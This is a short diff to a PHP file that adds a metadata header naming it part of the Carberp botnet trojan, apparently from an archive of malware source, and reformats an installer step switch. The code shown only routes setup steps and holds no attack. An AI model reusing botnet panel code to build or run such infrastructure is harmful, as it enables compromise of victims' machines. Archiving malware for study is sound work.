@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 error_reporting(0);
@@ -38,10 +49,12 @@ include('header.php');
 
 if(!empty($_GET['step'])) $_SESSION['step'] = $_GET['step'];
 
-switch($_SESSION['step']){	case '1':
+switch($_SESSION['step']){
+	case '1':
     	include('step1.php');
 	break;
-	case '2':
+
+	case '2':
     	include('step2.php');
 	break;
 
